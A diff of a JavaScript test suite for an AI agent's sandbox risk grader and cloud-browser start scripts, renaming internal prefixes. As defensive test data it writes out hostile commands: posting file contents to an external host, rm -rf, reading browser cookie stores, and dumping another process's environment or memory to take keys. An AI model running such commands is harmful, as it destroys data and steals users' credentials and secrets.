@@ -90,11 +90,11 @@ section('the names models reach for are read as meant (owner, 2026-10-07)');
   check('Python that posts data out asks', assessRisk('sandbox_run', { python: 'import requests\nrequests.post("https://x.example", data=open("a").read())' }) === 'sensitive');
   check('  whatever the session is called', assessRisk('sandbox_run', { python: 's = requests.Session()\ns.post("https://x.example", json=rows)' }) === 'sensitive');
   check('  so does a shell line inside it that destroys', assessRisk('sandbox_run', { python: '!rm -rf ~/work' }) === 'sensitive');
-  check('  and Python reaching for the browser\'s sign-ins', assessRisk('sandbox_run', { python: 'open(".synz-browser/profile/Default/Cookies","rb")' }) === 'sensitive');
+  check('  and Python reaching for the browser\'s sign-ins', assessRisk('sandbox_run', { python: 'open(".eph-browser/profile/Default/Cookies","rb")' }) === 'sensitive');
   check('ordinary Python analysis runs', assessRisk('sandbox_run', { python: 'import pandas as pd\ndf = pd.read_csv("downloads/a.csv")\ndf.describe()' }) === 'ordinary');
   check('  numpy and queues are analysis, not uploads', assessRisk('sandbox_run', { python: 'a = np.delete(a, 0)\nnp.put(a, [0], 1)\nq.put(item)' }) === 'ordinary');
   // A script written with `files` and then run put nothing for the command's grading to see.
-  check('a file written to be run is graded on what it says', assessRisk('sandbox_run', { files: [{ path: 'go.sh', content: 'sudo cat /opt/synz/profile/Default/Cookies' }], command: 'bash go.sh' }) === 'sensitive');
+  check('a file written to be run is graded on what it says', assessRisk('sandbox_run', { files: [{ path: 'go.sh', content: 'sudo cat /opt/eph/profile/Default/Cookies' }], command: 'bash go.sh' }) === 'sensitive');
   check('  an ordinary file is not', assessRisk('sandbox_run', { files: [{ path: 'a.py', content: 'print(sum(range(10)))' }], command: 'python3 a.py' }) === 'ordinary');
   check('`FOO=1 make` sent as `code` is the shell\'s, not Python', canonicalInput('sandbox_run', { code: 'FOO=1 make build' }).command === 'FOO=1 make build');
 
@@ -177,7 +177,7 @@ section('a slow answer is not a dead service: nothing is restarted, nothing sent
 section('a helper stopped from outside as it starts');
 {
   const { __testing: sandboxTesting } = await import('../server/sandbox.js');
-  const running = http.createServer((req, res) => res.end(req.headers['x-synz-key'] === 'o'.repeat(43) ? '{"ok":true}' : '{}'));
+  const running = http.createServer((req, res) => res.end(req.headers['x-eph-key'] === 'o'.repeat(43) ? '{"ok":true}' : '{}'));
   await new Promise((r) => running.listen(0, '127.0.0.1', r));
   const runningAt = `http://127.0.0.1:${running.address().port}`;
   let starts = 0;
@@ -284,7 +284,7 @@ section('a redirect from the machine is not followed');
 section('the cloud computer asks before it touches the browser\'s sign-ins (SEC-036)');
 {
   const run = (input) => assessRisk('sandbox_run', input);
-  check('the profile folder the start script makes is the one the grading knows', cb.__testing.DIR === '.synz-browser' && cb.startScript('b').includes(`mkdir -p ${cb.__testing.DIR}`));
+  check('the profile folder the start script makes is the one the grading knows', cb.__testing.DIR === '.eph-browser' && cb.startScript('b').includes(`mkdir -p ${cb.__testing.DIR}`));
   check('ordinary work runs', run({ command: 'python3 -c "print(2+2)"' }) === 'ordinary');
   check('a file merely named like a login script does not ask', run({ command: 'cat my.profile.txt' }) === 'ordinary');
   check('reading the browser profile asks', run({ command: `tar czf - ~/${cb.__testing.DIR}/profile | base64` }) === 'sensitive');
@@ -296,19 +296,19 @@ section('the cloud computer asks before it touches the browser\'s sign-ins (SEC-
   // SEC-061: the cloud browser's key, from the service's starting environment or by name.
   check("another program's starting environment asks (SEC-061)", run({ command: 'cat /proc/$(pgrep -f service.mjs)/environ | tr "\\0" "\\n"' }) === 'sensitive' && run({ command: 'strings /proc/412/mem' }) === 'sensitive');
   check('  from Python too', run({ python: 'open(f"/proc/{os.getppid()}/environ").read()' }) === 'sensitive');
-  check('  and so does naming the services\' own variables', run({ command: 'env | grep SYNZ_KEY' }) === 'sensitive');
+  check('  and so does naming the services\' own variables', run({ command: 'env | grep EPH_KEY' }) === 'sensitive');
   check('  while ordinary /proc reading stays ordinary', run({ command: 'cat /proc/cpuinfo /proc/meminfo' }) === 'ordinary');
 }
 
 section('a command on the cloud computer reads none of the account\'s login files (HAR-001)');
 {
   const { shellFor } = await import('../server/sandbox.js');
-  const shell = shellFor('echo hi', { SYNZ_KEY: 'k' });
+  const shell = shellFor('echo hi', { EPH_KEY: 'k' });
   check('bash with no profile and no rc file', shell.cmd === 'bash' && shell.args.slice(0, 3).join(' ') === '--noprofile --norc -c', JSON.stringify(shell.args.slice(0, 3)));
   check('  the system profile alone, then the command', /^_home="\$HOME"; HOME=\/nonexistent; source \/etc\/profile /.test(shell.args[3]) && shell.args[3].endsWith('\necho hi') && !/\.(bash_)?profile\b(?!.*etc)|bashrc/.test(shell.args[3].replace('/etc/profile', '')), shell.args[3]);
   // E2B's /etc/profile ends by sourcing ~/.bashrc and ~/.profile (live probe, 2026-11-02): read with no home, they are not found.
   check('  read with no home, so a system profile that sources ~/.profile finds nothing of the account\'s', /HOME=\/nonexistent; source \/etc\/profile [^\n]*; HOME="\$_home"; unset _home\n/.test(shell.args[3]));
-  check('  BASH_ENV cleared, and the caller\'s own environment kept', shell.env.BASH_ENV === '' && shell.env.ENV === '' && shell.env.SYNZ_KEY === 'k');
+  check('  BASH_ENV cleared, and the caller\'s own environment kept', shell.env.BASH_ENV === '' && shell.env.ENV === '' && shell.env.EPH_KEY === 'k');
   const userShell = shellFor('echo hi', {}, { userBin: true });
   check('a service start keeps the account\'s own folders off its PATH', !/\.local\/bin/.test(shell.args[3]) && /case "\$_d" in "\$HOME"\*\|\[!\/\]\*/.test(shell.args[3]) && /if \[ -w "\$_d" \]; then _open=/.test(shell.args[3]) && shell.args[3].indexOf('$_open') < shell.args[3].indexOf(':$_orig'), shell.args[3]);
   check('  and a command the account runs has them after the system\'s, never ahead', /export PATH="\$\{_keep:-[^}]*\}:\$HOME\/\.local\/bin:\$HOME\/bin"/.test(userShell.args[3]), userShell.args[3]);
@@ -323,7 +323,7 @@ section('a command on the cloud computer reads none of the account\'s login file
   if (probe.status !== 0) {
     console.log('  (skipped: no bash here — this runs in CI on Linux)');
   } else {
-    const home = fs.mkdtempSync(path.join(os.tmpdir(), 'synz-profile-'));
+    const home = fs.mkdtempSync(path.join(os.tmpdir(), 'eph-profile-'));
     fs.writeFileSync(path.join(home, '.bash_profile'), 'echo planted > "$HOME/ran"\n');
     const env = { ...process.env, HOME: home };
     spawnSync('bash', ['-lc', 'true'], { env });
@@ -347,7 +347,7 @@ section('the start script installs once per build and then runs the service');
   const script = cb.startScript('abc123');
   check('installs only when the build changed', /if \[ "\$\(cat build 2>\/dev\/null\)" != "abc123" \]/.test(script));
   check('pins its dependencies', script.includes('playwright-core@1.63.0') && script.includes('@sparticuz/chromium@153.0.0') && script.includes('ws@8.21.1'));
-  check('writes the Python kernel beside the service', script.includes('"$SYNZ_KERNEL" | base64 -d > kernel.py'));
+  check('writes the Python kernel beside the service', script.includes('"$EPH_KERNEL" | base64 -d > kernel.py'));
   check('the build changes when the kernel does — a new kernel reinstalls', cb.__testing.service().build.length === 16 && fs.readFileSync(new URL('../server/cloudBrowser/kernel.py', import.meta.url), 'utf8').includes('def main'));
   // Owner, 2026-11-08: the Python session fetched Chromium again on every new machine.
   const service = fs.readFileSync(new URL('../server/cloudBrowser/service.mjs', import.meta.url), 'utf8');
@@ -357,7 +357,7 @@ section('the start script installs once per build and then runs the service');
 
   const root = cb.startScript('abc123', { root: true });
   check('as root: refuses to go on when it is not root', /if \[ "\$\(id -u\)" != 0 \]; then echo "not root" >&2; exit 3; fi/.test(root));
-  check('  lives in a folder root owns, not the account\'s working folder', root.includes(`cd ${cb.__testing.ROOT_DIR}`) && /chown root:root \/opt\/synz/.test(root) && !root.includes(`cd ${cb.__testing.DIR}`));
+  check('  lives in a folder root owns, not the account\'s working folder', root.includes(`cd ${cb.__testing.ROOT_DIR}`) && /chown root:root \/opt\/eph/.test(root) && !root.includes(`cd ${cb.__testing.DIR}`));
   check('  the sign-ins move there once and are closed to everybody else', root.indexOf('mv "$OLDPROFILE" profile.moving') < root.indexOf('chmod 700 profile.moving') && root.includes('chmod 700 profile && chown -R root:root profile'));
   check('  all of it, folders inside included, before any link in it is looked for (SBX-012)', root.indexOf('chmod -R go-rwx profile.moving') > root.indexOf('chown -R root:root profile.moving') && root.indexOf('chmod -R go-rwx profile.moving') < root.indexOf('find profile.moving -type l'));
   check('  only a real folder moves, never a link the account planted', /\[ -d "\$OLDPROFILE" \] && \[ ! -L "\$OLDPROFILE" \]/.test(root));
@@ -365,11 +365,11 @@ section('the start script installs once per build and then runs the service');
   // once moved it is in root's folder and cannot be swapped, so it is checked there.
   check('  and is checked again after the move, before anything follows it', root.indexOf('if [ -L profile.moving ] || [ ! -d profile.moving ]; then rm -f profile.moving') < root.indexOf('chmod 700 profile.moving') && root.indexOf('mv "$OLDPROFILE" profile.moving') < root.indexOf('if [ -L profile.moving ]'));
   check('  and links inside it are removed after it is shut to the account, or the old profile is dropped', root.indexOf('chown -R root:root profile.moving') < root.indexOf('find profile.moving -type l') && /else rm -rf profile\.moving; fi/.test(root));
-  check('  the account the Python session runs as is the owner of the working folder', /SYNZ_RUN_UID="\$\(stat -c %u "\$WORK"\)"/.test(root));
+  check('  the account the Python session runs as is the owner of the working folder', /EPH_RUN_UID="\$\(stat -c %u "\$WORK"\)"/.test(root));
   check('  an older service is stopped only if the account owns that process', /stat -c %u \/proc\/\$OLD/.test(root));
-  check('  and nothing it executes is in a folder the account can write', !/node_modules|service\.mjs/.test(root.split('cd /opt/synz')[0]));
+  check('  and nothing it executes is in a folder the account can write', !/node_modules|service\.mjs/.test(root.split('cd /opt/eph')[0]));
   // @sparticuz/chromium runs `<tmp>/chromium` if it exists, unchecked.
-  check('  its temporary folder is root\'s own, so Chromium is never run from the shared /tmp', /export TMPDIR=\/opt\/synz\/tmp/.test(root) && root.indexOf('export TMPDIR') < root.indexOf('exec env SYNZ_KEY_FILE'));
+  check('  its temporary folder is root\'s own, so Chromium is never run from the shared /tmp', /export TMPDIR=\/opt\/eph\/tmp/.test(root) && root.indexOf('export TMPDIR') < root.indexOf('exec env EPH_KEY_FILE'));
   const { shellFor, ROOT_NODE_DIR } = await import('../server/sandbox.js');
   const rootShell = shellFor('true', {}, { root: true }).args[3];
   check('as root, PATH keeps only folders root alone can write, and never falls back to the original', /stat -c %u/.test(rootShell) && /\*\[2367\]\*\) _ok=; break/.test(rootShell) && !rootShell.includes('_orig'), rootShell);
@@ -391,20 +391,20 @@ section('the start script installs once per build and then runs the service');
   check('  as root, nothing goes through sudo (SBX-009)', !/sudo -n (sh|\$pm|apt-get)/.test(root) && /\$su_ \$pm install/.test(root) && /\{ \[ -n "\$su_" \] && \$su_ sh -c/.test(root));
   check('  with whichever package manager the image has', /dnf microdnf yum/.test(script));
   check('  apt-get too, for E2B\'s Debian, root or not', /command -v apt-get[^]*fonts-noto-core[^]*\) \|\| true; fi/.test(script) && /if \[ "\$\(id -u\)" = 0 \]; then su_=; else su_="sudo -n"; fi/.test(script));
-  check('an older service is stopped by its pid before the new one starts', script.indexOf('service.pid') < script.indexOf('exec env SYNZ_KEY_FILE'));
+  check('an older service is stopped by its pid before the new one starts', script.indexOf('service.pid') < script.indexOf('exec env EPH_KEY_FILE'));
   // SEC-061: on E2B the service runs as the account, which can read any of its own processes' /proc/<pid>/environ.
   check('the key reaches the service in a file only its owner reads, not in its starting environment (SEC-061)',
-    /\( umask 077; printf %s "\$SYNZ_KEY" > service\.key \)\nunset SYNZ_KEY\n/.test(script) && /\nexec env SYNZ_KEY_FILE="\$PWD\/service\.key" node service\.mjs /.test(script)
-      && /\nunset SYNZ_KEY\n/.test(root) && /\nexec env SYNZ_KEY_FILE=/.test(root));
+    /\( umask 077; printf %s "\$EPH_KEY" > service\.key \)\nunset EPH_KEY\n/.test(script) && /\nexec env EPH_KEY_FILE="\$PWD\/service\.key" node service\.mjs /.test(script)
+      && /\nunset EPH_KEY\n/.test(root) && /\nexec env EPH_KEY_FILE=/.test(root));
   // SBX-006: an install runs the packages' own scripts in this shell.
   check('  and leaves this shell before anything is installed, as root or not (SBX-006)',
-    [script, root].every((s) => s.indexOf('unset SYNZ_KEY') > -1 && s.indexOf('unset SYNZ_KEY') < s.indexOf('npm install')));
+    [script, root].every((s) => s.indexOf('unset EPH_KEY') > -1 && s.indexOf('unset EPH_KEY') < s.indexOf('npm install')));
   const { bridgeStartScript } = await import('../server/mcp/cloud.js');
-  check('  and the MCP bridge\'s the same way', /\( umask 077; printf %s "\$SYNZ_MCP_KEY" > bridge\.key \)\nexec env -u SYNZ_MCP_KEY SYNZ_MCP_KEY_FILE="\$PWD\/bridge\.key" node bridge\.mjs/.test(bridgeStartScript()));
+  check('  and the MCP bridge\'s the same way', /\( umask 077; printf %s "\$EPH_MCP_KEY" > bridge\.key \)\nexec env -u EPH_MCP_KEY EPH_MCP_KEY_FILE="\$PWD\/bridge\.key" node bridge\.mjs/.test(bridgeStartScript()));
   // `pkill -f 'node service.mjs'` matched the shell running this script, whose
   // own command line holds those words, and killed it before `exec`.
   check('and never by a name the script itself contains', !/pkill -f/.test(script));
-  check('no key is written into the script (they travel as env)', !/SYNZ_KEY=/.test(script));
+  check('no key is written into the script (they travel as env)', !/EPH_KEY=/.test(script));
 }
 
 section('the start script really reaches the service, run under bash');
@@ -416,13 +416,13 @@ section('the start script really reaches the service, run under bash');
   if (probe.status !== 0) {
     console.log('  (skipped: no bash here — this runs in CI on Linux)');
   } else {
-    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'synz-start-'));
+    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'eph-start-'));
     const bin = path.join(dir, 'bin');
     fs.mkdirSync(bin);
     // A node that says it started and exits; an npm that installs nothing; no sudo.
     fs.writeFileSync(path.join(bin, 'node'), '#!/bin/sh\nif [ "$1" = "-v" ]; then echo v22; exit 0; fi\necho started > ran\n', { mode: 0o755 });
     // An npm that says so if it was handed the key (SBX-006).
-    fs.writeFileSync(path.join(bin, 'npm'), '#!/bin/sh\nif [ -n "$SYNZ_KEY" ]; then echo leaked > npm-saw-key; fi\nexit 0\n', { mode: 0o755 });
+    fs.writeFileSync(path.join(bin, 'npm'), '#!/bin/sh\nif [ -n "$EPH_KEY" ]; then echo leaked > npm-saw-key; fi\nexit 0\n', { mode: 0o755 });
     fs.writeFileSync(path.join(bin, 'sudo'), '#!/bin/sh\nexit 1\n', { mode: 0o755 });
     // `-c`, not the `-lc` the sandbox uses: a login shell on a CI runner reads
     // the image's profile, which resets PATH from /etc/environment — the fakes
@@ -431,20 +431,20 @@ section('the start script really reaches the service, run under bash');
     const run = () =>
       spawnSync('bash', ['-c', cb.startScript('t1')], {
         cwd: dir,
-        env: { ...process.env, HOME: dir, PATH: `${bin}:${process.env.PATH}`, SYNZ_SERVICE: Buffer.from('// service').toString('base64'), SYNZ_KEY: 'k-start-test' },
+        env: { ...process.env, HOME: dir, PATH: `${bin}:${process.env.PATH}`, EPH_SERVICE: Buffer.from('// service').toString('base64'), EPH_KEY: 'k-start-test' },
         timeout: 20_000,
       });
     const first = run();
-    const ran = path.join(dir, '.synz-browser', 'ran');
+    const ran = path.join(dir, '.eph-browser', 'ran');
     const logOf = () => {
       try {
-        return fs.readFileSync(path.join(dir, '.synz-browser', 'service.log'), 'utf8').slice(-200);
+        return fs.readFileSync(path.join(dir, '.eph-browser', 'service.log'), 'utf8').slice(-200);
       } catch {
         return '(no service.log)';
       }
     };
     check('a first start reaches the service', first.status === 0 && fs.existsSync(ran), `exit ${first.status} ${String(first.stderr).slice(0, 200)} ${logOf()}`);
-    check('  and its install never saw the key (SBX-006)', !fs.existsSync(path.join(dir, '.synz-browser', 'npm-saw-key')) && fs.readFileSync(path.join(dir, '.synz-browser', 'service.key'), 'utf8') === 'k-start-test');
+    check('  and its install never saw the key (SBX-006)', !fs.existsSync(path.join(dir, '.eph-browser', 'npm-saw-key')) && fs.readFileSync(path.join(dir, '.eph-browser', 'service.key'), 'utf8') === 'k-start-test');
     fs.rmSync(ran, { force: true });
     const second = run();
     check('  and so does a restart over an old pid', second.status === 0 && fs.existsSync(ran), `exit ${second.status}`);
@@ -452,7 +452,7 @@ section('the start script really reaches the service, run under bash');
     // server fall back without waiting out the whole start.
     if (typeof process.getuid === 'function' && process.getuid() !== 0) {
       const asRoot = spawnSync('bash', ['-c', cb.startScript('t1', { root: true })], { cwd: dir, env: { ...process.env, HOME: dir, PATH: `${bin}:${process.env.PATH}` }, timeout: 20_000 });
-      check('the root layout, started without root, stops at once and touches nothing', asRoot.status === 3 && !fs.existsSync('/opt/synz/service.mjs'), `exit ${asRoot.status}`);
+      check('the root layout, started without root, stops at once and touches nothing', asRoot.status === 3 && !fs.existsSync('/opt/eph/service.mjs'), `exit ${asRoot.status}`);
     }
     fs.rmSync(dir, { recursive: true, force: true });
   }
@@ -686,13 +686,13 @@ if (!chrome) {
 
   const port = 3900 + Math.floor(Math.random() * 90);
   const key = 'k'.repeat(43);
-  const profile = fs.mkdtempSync(path.join(os.tmpdir(), 'synz-cb-'));
-  const work = fs.mkdtempSync(path.join(os.tmpdir(), 'synz-work-'));
+  const profile = fs.mkdtempSync(path.join(os.tmpdir(), 'eph-cb-'));
+  const work = fs.mkdtempSync(path.join(os.tmpdir(), 'eph-work-'));
   // Handed over the way the start script does it (SEC-061): in a file, which the service deletes.
   const keyFile = path.join(work, 'service.key');
   fs.writeFileSync(keyFile, key);
   const child = spawn(process.execPath, ['server/cloudBrowser/service.mjs'], {
-    env: { ...process.env, SYNZ_KEY_FILE: keyFile, PORT: String(port), CHROME_PATH: chrome, SYNZ_PROFILE: profile, SYNZ_WORKDIR: work },
+    env: { ...process.env, EPH_KEY_FILE: keyFile, PORT: String(port), CHROME_PATH: chrome, EPH_PROFILE: profile, EPH_WORKDIR: work },
     stdio: 'ignore',
   });
   const base = `http://127.0.0.1:${port}`;
@@ -708,7 +708,7 @@ if (!chrome) {
   try {
     let health = null;
     for (let i = 0; i < 40 && !health; i++) {
-      health = await fetch(`${base}/health`, { headers: { 'x-synz-key': key } }).then((r) => (r.ok ? r.json() : null), () => null);
+      health = await fetch(`${base}/health`, { headers: { 'x-eph-key': key } }).then((r) => (r.ok ? r.json() : null), () => null);
       if (!health) await new Promise((r) => setTimeout(r, 250));
     }
     check('the service takes its key from the file it was handed, and deletes the file (SEC-061)', !!health && !fs.existsSync(keyFile));
@@ -923,17 +923,17 @@ section('the live Python session keeps what a cell defined');
   } else {
     const port = 3990 + Math.floor(Math.random() * 9);
     const key = 'p'.repeat(43);
-    const work = fs.mkdtempSync(path.join(os.tmpdir(), 'synz-py-'));
+    const work = fs.mkdtempSync(path.join(os.tmpdir(), 'eph-py-'));
     const child = spawn(process.execPath, ['server/cloudBrowser/service.mjs'], {
-      env: { ...process.env, SYNZ_KEY: key, PORT: String(port), SYNZ_WORKDIR: work, SYNZ_PYTHON: python, SYNZ_KERNEL_PATH: path.resolve('server/cloudBrowser/kernel.py'), SYNZ_PROFILE: path.join(work, 'profile') },
+      env: { ...process.env, EPH_KEY: key, PORT: String(port), EPH_WORKDIR: work, EPH_PYTHON: python, EPH_KERNEL_PATH: path.resolve('server/cloudBrowser/kernel.py'), EPH_PROFILE: path.join(work, 'profile') },
       stdio: 'ignore',
     });
     const base = `http://127.0.0.1:${port}`;
     const cell = (body) =>
-      fetch(`${base}/py`, { method: 'POST', headers: { 'x-synz-key': key, 'content-type': 'application/json' }, body: JSON.stringify(body) }).then((r) => r.json());
+      fetch(`${base}/py`, { method: 'POST', headers: { 'x-eph-key': key, 'content-type': 'application/json' }, body: JSON.stringify(body) }).then((r) => r.json());
     try {
       for (let i = 0; i < 40; i++) {
-        if (await fetch(`${base}/health`, { headers: { 'x-synz-key': key } }).then((r) => r.ok, () => false)) break;
+        if (await fetch(`${base}/health`, { headers: { 'x-eph-key': key } }).then((r) => r.ok, () => false)) break;
         await new Promise((r) => setTimeout(r, 250));
       }
       const one = await cell({ session: 'a', code: 'rows = [3, 4, 5]\nprint("loaded", len(rows))' });
@@ -964,7 +964,7 @@ section('the live Python session keeps what a cell defined');
       check('a shell line, then an import, in one cell', /installed/.test(pip.output) && pip.result === "'[1]'", JSON.stringify(pip));
       const noKey = await fetch(`${base}/py`, { method: 'POST', body: '{"code":"1"}' });
       check('Python is the server\'s to ask: no key, no cell', noKey.status === 401);
-      const secret = await cell({ session: 'a', code: 'import os\n[k for k in os.environ if k.startswith("SYNZ")]' });
+      const secret = await cell({ session: 'a', code: 'import os\n[k for k in os.environ if k.startswith("EPH")]' });
       check('the session\'s environment carries nothing of the service\'s', secret.result === '[]', JSON.stringify(secret));
     } finally {
       child.kill();
